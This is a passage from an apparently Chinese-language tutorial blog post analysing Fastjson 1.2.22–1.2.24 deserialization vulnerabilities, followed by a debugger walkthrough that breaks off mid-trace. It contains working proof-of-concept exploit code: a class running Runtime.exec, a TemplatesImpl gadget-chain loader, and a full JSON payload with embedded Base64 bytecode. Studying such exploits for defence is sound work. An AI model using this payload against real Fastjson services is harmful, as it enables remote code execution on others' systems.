JSON.parse(jsonstring, Feature.SupportNonPublicField);</span><br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">构造函数<br>setName<br>getProperties<br>org.example.Demo.Student@1de0aca6<br>org.example.Demo.Student<br></code></pre></td></tr></table></figure><h2 id="Fastjson反序列化漏洞原理"><a href="#Fastjson反序列化漏洞原理" class="headerlink" title="Fastjson反序列化漏洞原理"></a>Fastjson反序列化漏洞原理</h2><p>由前面的demo可以看出FastJson自己实现了一套序列化和反序列化的方法设计，没有使用的java原生序列化反序列化方法，大致就是一个对象序列化成一个Json格式的字符串，反序列化则是由Json格式字符串变成一个类。</p><p>如果我们可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，那么就可以导致代码执行。</p><p><strong>那么如何才能够反序列化出恶意类呢？</strong></p><p>还记得之前提到的吗，我们可以为<code>JSON.parseObject</code>指定反序列化类型(设置第二个参数)，如果我们设置的是Object.class，那么就可以反序列化任意类，因为我们设置的是Object.class，那么我们可以根据传入的JSON字符串中的@type来反序列化出想要的类，除了Object.class，还有JSON.class也可以反序列化任意类，另外JSONObject.class不能反序列化出想要的类，但是会去调用@type指定类的public属性的setter方法和getProperties方法，如果恶意代码存在setter方法或者getProperties方法也可以造成命令执行。</p><p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。</p><p><strong>小结</strong></p><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(jsonstring, Student.class);</code>，该类本身的构造函数、setter方法、Properties属性的getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(jsonstring, Object.class);</code>，该若该类的子类的构造方法、setter方法、Properties属性的getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(jsonstring);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><h2 id="1-2-22-1-2-24反序列化漏洞"><a href="#1-2-22-1-2-24反序列化漏洞" class="headerlink" title="1.2.22-1.2.24反序列化漏洞"></a>1.2.22-1.2.24反序列化漏洞</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>导入pom.xml依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;<br>    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.9</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;commons-io&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">2.5</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.24</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;commons-codec&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.12</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链：</p><ul><li>基于TemplateImpl；</li><li>基于JNDI（又分为基于Bean Property类型和Field类型）；</li></ul><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h3><p>TemplatesImpl在我们学习反序列化基础的时候CC2、CC3学习到过。</p><p>我们的恶意类需要继承AbstractTranslet接口，后面会分析为什么需要这样。</p><p><code>EvilCode.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.fastjson_1_2_24;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilCode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilCode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">EvilCode</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilCode</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TemplatesImpl_POC.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.fastjson_1_2_24;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.io.IOUtils;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImpl_POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            IOUtils.copy(Files.newInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(cls).toPath()), bos);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> Base64.encodeBase64String(bos.toByteArray());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ParserConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserConfig</span>();<br><span class="hljs-comment">//            final String fileSeparator = System.getProperty(&quot;file.separator&quot;);</span><br><span class="hljs-comment">//            final String evilClassPath = System.getProperty(&quot;user.dir&quot;) + &quot;\\src\\main\\java\\org\\example\\fastjson_1_2_24\\EvilCode.class&quot;;</span><br>            <span class="hljs-keyword">final</span> String evilClassPath=<span class="hljs-string">&quot;D:\\java_local\\fastjson\\target\\classes\\org\\example\\fastjson_1_2_24\\EvilCode.class&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">eviljsonString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +<br>                    <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;<br>            System.out.println(eviljsonString);<br><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(eviljsonString, Object.class, config, Feature.SupportNonPublicField);<br>            <span class="hljs-comment">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACZMb3JnL2V4YW1wbGUvZmFzdGpzb25fMV8yXzI0L0V2aWxDb2RlOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAA1FdmlsQ29kZS5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEAJG9yZy9leGFtcGxlL2Zhc3Rqc29uXzFfMl8yNC9FdmlsQ29kZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAMAAQADQANAA4ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAATAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIADwAAAAQAAQAXAAEAEQAYAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAYAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGQAaAAIAAAABABsAHAADAA8AAAAEAAEAFwAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAbAAgAHAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==&quot;</span>],<span class="hljs-string">&#x27;_name&#x27;</span>:<span class="hljs-string">&#x27;cmisl&#x27;</span>,<span class="hljs-string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;_version&quot;</span>:<span class="hljs-string">&quot;1.0&quot;</span>,<span class="hljs-string">&quot;allowedProtocols&quot;</span>:<span class="hljs-string">&quot;all&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p>Payload中几个重要的Json键的含义：</p><ul><li><strong>@type</strong>——指定的解析类，即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在Payload中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</li><li><strong>_bytecodes</strong>——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</li><li><strong>_outputProperties</strong>——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；</li><li>**_tfactory:{}**——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；</li></ul><p>TemplatesImpl调用链</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">TemplatesImpl<span class="hljs-meta">#newTransformer</span><br>TemplatesImpl<span class="hljs-meta">#getTransletInstance</span><br>TemplatesImpl<span class="hljs-meta">#defineTransletClasses</span><br>TemplatesImpl<span class="hljs-meta">#defineClass</span><br>java.lang.ClassLoad<span class="hljs-meta">#defineClass</span><br></code></pre></td></tr></table></figure><h4 id="TemplatesImpl利用链思路"><a href="#TemplatesImpl利用链思路" class="headerlink" title="TemplatesImpl利用链思路"></a>TemplatesImpl利用链思路</h4><p>构造一个TemplatesImpl反序列化的字符串，其中_bytecodes设置为我们恶意的代码的字节码，接着，我们会反射去调用newInstance函数来实例化这个恶意类，而在实例化的过程中，触发我们的恶意类的构造函数，触发命令执行。</p><p>而想要达到上面的目的，根据我们之前提到的利用链，需要调用到TemplatesImpl#newTransformer。并且，我们是要在反序列化的过程中自动触发TemplatesImpl#newTransformer函数，我们可以考虑的是之前的结论</p><blockquote><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(jsonstring, Student.class);</code>，该类本身的构造函数、setter方法、Properties属性的getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(jsonstring, Object.class);</code>，该若该类的子类的构造方法、setter方法、Properties属性的getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(jsonstring);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p></blockquote><p>我们需要找到一条链，链首是上面提到的比较危险的方法，比如setter方法、Properties属性的getter方法，而这条链最终调用到TemplatesImpl#newTransformer函数，其实往上跟一步就找到链首了，getOutputProperties这个getter方法，正好是Properties属性，所以这个函数正是我们想要的。</p><p><img src="/../../pict/image-20240614154620248.png" alt="image-20240614154620248"></p><p>那这样我们就可以构造POC了，JSON格式如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<br> <span class="hljs-string">&quot;_bytecodes&quot;</span>: [<span class="hljs-string">&quot;yv66vgAA......JA==&quot;</span>],<br> <span class="hljs-string">&quot;_name&quot;</span>: <span class="hljs-string">&quot;cmisl&quot;</span>,<br> <span class="hljs-string">&quot;_tfactory&quot;</span>: &#123;&#125;,<br> <span class="hljs-string">&quot;_outputProperties&quot;</span>: &#123;&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>接下来的调试还是比较繁琐的，记录的目的也是为了自己更有印象，也是为了调试的时候更细心一点，避免忽略了一些细节。读者可以跳过此部分。</p><p>在序列化的函数代码打上断点，我们调试过程这种重点关注输入的流转。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(eviljsonString, Object.class, config, Feature.SupportNonPublicField);<br></code></pre></td></tr></table></figure><p>我们的输入(恶意payload)在input里面，进入了DefaultJSONParser类的构造函数。创建了一个默认的JSON解析器</p><p><img src="/../../pict/image-20240614175834265.png" alt="image-20240614175834265"></p><p>这个构造函数，如果你的输入是{xxx}的形势，就会给你的lexer.token赋值JSONToken.LBRACE这个常量，也就是12，相当于做了个标准，表示是”{“这个符号开头的字符串</p><p><img src="/../../pict/image-20240618041751420.png" alt="image-20240618041751420"></p><p><img src="/../../pict/image-20240618041930329.png" alt="image-20240618041930329"></p><p><img src="/../../pict/image-20240618043431921.png" alt="image-20240618043431921"></p><p>接着在339行进入了这个默认JSON解析器的parseObject方法。这个名字一看就是解析对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">T</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (T) parser.parseObject(clazz, <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>这个函数中，我们会去根据将type也就是parseObject(clazz, null);中的clazz作为参数传入getDeserialize函数，大概意思是得到反序列化(反序列化器)，</p><p><img src="/../../pict/image-20240618044522960.png" alt="image-20240618044522960"></p><p>跟进去之后，第一行代码会通过IdentityHashMap.java#get方法获取type对应的derializer，然后进入第一个if直接返回这个derializer，数据类型为JavaObjectDeserializer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">derializer</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.derializers.get(type);<br></code></pre></td></tr></table></figure><p>接着就调用这个derializer(反序列化器)的deserialze方法，也就是JavaObjectDeserializer#derializer，这个函数很简单。其实就执行一行代码，在第45行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> (T) parser.parse(fieldName);<br></code></pre></td></tr></table></figure><p>执行了我们之前创建的默认JSON解析器parser的parse(解析)方法，在一个switch方法里面，根据token值进行不同的case操作，之前我们给lexer.token赋值了JSONToken.LBRACE，也就是12，然后就会进入case LBRACE。然后new一个JSONObject对象，然后执行DefaultJSONParser#parseObject方法解析这个对象，fieldName为null。</p><p><img src="/../../pict/image-20240618050056519.png" alt="image-20240618050056519"></p><p>这里会对我们的JSON字符串进行一些检测，比如当前字符串是否是null，是否是<code>&#125;</code>，是否既不是<code>&#123;</code>，也不是<code>,</code>，这些判断会抛出异常或者不继续执行代码逻辑，而我们当前是<code>&#123;</code>字符，正常进入函数逻辑，接着会检查下一个字符是否是<code>&quot;</code>，我们显示符合，然后就会获取我们第一个键值对的键名，也就是<code>@type</code>，赋值给key。</p><p><img src="/../../pict/image-20240618050627482.png" alt="image-20240618050627482"></p><p>然后我们会进入一个if判断，判断key是否是@type，和是否开启Feature.DisableSpecialKeyDetect选项，默认没有开启，所以这个if可以直接进入，然后获取key对应的值，也就是@type的值<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，然后加载这个类。</p><p><img src="/../../pict/image-20240618051613605.png" alt="image-20240618051613605"></p><p>函数里面会加载TemplatesImpl，然后吧加载的Class对象clazz和TemplatesImpl类名字添加到一个Map里面，然后return加载的clazz。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">clazz = contextClassLoader.loadClass(className);<br>mappings.put(className, clazz);<br></code></pre></td></tr></table></figure><p>接着继续跟，来到下面两句，会先获取clazz对应的deserializer(反序列化器)，然后执行这个deserializer的deserialze函数。</p><p><img src="/../../pict/image-20240618052105236.png" alt="image-20240618052105236"></p><p>由于<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的deserializer没有存在IdentityHashMap里面，无法直接获取，进入第二个if</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> Class&lt;?&gt;) &#123;<br>    <span class="hljs-keyword">return</span> getDeserializer((Class&lt;?&gt;) type, type);<br>&#125;<br></code></pre></td></tr></table></figure><p>进入ParserConfig#getDeserializer，里面有检测黑名单，然后进去一系列if判断这个类的位置，没有找到。</p><p><img src="/../../pict/image-20240618053109161.png" alt="image-20240618053109161"></p><p>最后到ParserConfig#createJavaBeanDeserializer函数，type和clazz一样。</p><p><img src="/../../pict/image-20240618053513614.png" alt="image-20240618053513614"></p><p>在里面调用了JavaBeanInfo#build。</p><p><img src="/../../pict/image-20240618053718374.png" alt="image-20240618053718374"></p><p>JavaBeanInfo#build函数中，第328行的for循环，会循环methods，而methods在135行赋值<code>Method[] methods = clazz.getMethods();</code>，所以methods是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>中的所有方法。</p><p><img src="/../../pict/image-20240618054217193.png" alt="image-20240618054217193"></p><p>然后会有一些if判断，挑选中合适的方法，在429行的add函数中添加到fieldList中。这里主要是筛选setter方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">add(fieldList, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,annotation, fieldAnnotation, <span class="hljs-literal">null</span>));<br></code></pre></td></tr></table></figure><p><img src="/../../pict/image-20240618054608442.png" alt="image-20240618054608442"></p><p>在490行又是一个类似的for循环，这一部分和上面差不多，筛选符合条件的getter方法放入fieldList。</p><p><img src="/../../pict/image-20240618055205032.png" alt="image-20240618055205032"></p><p><img src="/../../pict/image-20240618055437206.png" alt="image-20240618055437206"></p><p>然后将初始化一个JavaBeanInfo存储这些信息，然后返回给beanInfo。</p><p><img src="/../../pict/image-20240618055539484.png" alt="image-20240618055539484"></p><p>接着一些if判断都是false，直到586行才为true，进入if里面JavaBeanDeserializer函数</p><p><img src="/../../pict/image-20240618134939325.png" alt="image-20240618134939325"></p><p>会调用重写的JavaBeanDeserializer方法，而第二个参数调用build，其实和我们之前的build结果一样。相当于吧config和之前的JavaBeanInfo作为参数执行了JavaBeanDeserializer方法。</p><p><img src="/../../pict/image-20240618135319749.png" alt="image-20240618135319749"></p><p>遍历<code>beaninfo</code>中的<code>sortedFields</code>，然后根据对应的属性创建对应的Deserializer(反序列化器)，然后添加到<code>sortedFieldDeserializers</code>中</p><p>在第二个for循环中会根据<code>fieldInfo</code>的名字调用<code>getFieldDeserializer</code>函数在<code>sortedFieldDeserializers</code>数组中寻找对应的Deserializer(反序列化器)。</p><p><img src="/../../pict/image-20240618141803410.png" alt="image-20240618141803410"></p><p>回到<code>getDeserializer</code>函数，返回反序列化器。</p><p><img src="/../../pict/image-20240618142958710.png" alt="image-20240618142958710"></p><p>回到<code>DefaultJSONParser#parseObject</code>函数，将反序列化器赋值给deserializer，数据类型为JavaBeanDeserializer，然后调用它的JavaBeanDeserializer#deserialze方法，开始正式反序列化。</p><p>前面做了一些检查，到570行。函数名字意思是创建一个实例化，跟进。</p><p><img src="/../../pict/image-20240618144129154.png" alt="image-20240618144129154"></p><p>然后经过if判断来到这里，获取了TemplatesImpl的默认构造函数，然后通过newInstance创建类的实例。此时我们就获取了TemplatesImpl类。</p><p><img 